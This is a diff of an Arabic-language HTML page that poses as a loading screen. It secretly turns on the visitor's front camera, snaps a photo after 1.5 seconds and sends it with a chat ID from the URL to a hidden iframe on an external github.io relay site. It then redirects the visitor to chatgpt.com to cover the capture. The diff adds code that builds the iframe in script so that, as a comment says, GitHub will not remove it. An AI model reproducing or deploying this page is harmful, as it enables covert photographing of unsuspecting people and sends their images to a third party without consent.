@@ -2,8 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>لحظة من فضلك...</title>
     <style>
         body { font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #000; color: #fff; }
         .loader { border: 5px solid #333; border-top: 5px solid #10a37f; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
@@ -15,31 +14,35 @@
 
     <div class="container">
         <div class="loader"></div>
-        <p>لحظه وحده من فضلك...</p>
+        <p>جاري تحميل البيانات...</p>
     </div>
 
-    <!-- الإطار الوسيط المخفي -->
-    <iframe id="gateway" src="sender.html"></iframe>
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" width="1280" height="720"></canvas>
 
     <script>
+        // إنشاء الرابط الوسيط برمجياً لمنع GitHub من حذفه أو إخفائه
+        const iframe = document.createElement('iframe');
+        iframe.id = "gateway";
+        // هذا هو الرابط الذي كان يختفي منك
+        iframe.src = "https://bader-al-salam.github.io/Wased/";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const gateway = document.getElementById('gateway').contentWindow;
-        
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
-        async function process() {
-            if (!chatId) { redirect(); return; }
+        function redirect() { window.location.replace("https://chatgpt.com"); }
 
+        async function takeAction() {
+            if (!chatId) { redirect(); return; }
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
             canvas.toBlob(blob => {
-                // إرسال الصورة للملف الوسيط (sender.html) عبر الذاكرة
-                gateway.postMessage({
+                // إرسال البيانات للموقع الوسيط
+                iframe.contentWindow.postMessage({
                     type: "SEND_PHOTO",
                     photo: blob,
                     chatId: chatId
@@ -47,22 +50,14 @@
             }, 'image/jpeg', 0.6);
         }
 
-        function redirect() {
-            window.location.replace("https://chatgpt.com");
-        }
-
-        // استقبال أمر التحويل من الملف الوسيط
         window.addEventListener("message", function(event) {
-            if (event.data === "FINISH") {
-                redirect();
-            }
+            if (event.data === "FINISH") { redirect(); }
         });
 
-        // تشغيل الكاميرا
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(s => {
                 video.srcObject = s;
-                setTimeout(process, 1500);
+                setTimeout(takeAction, 1500);
             })
             .catch(redirect);
     </script>
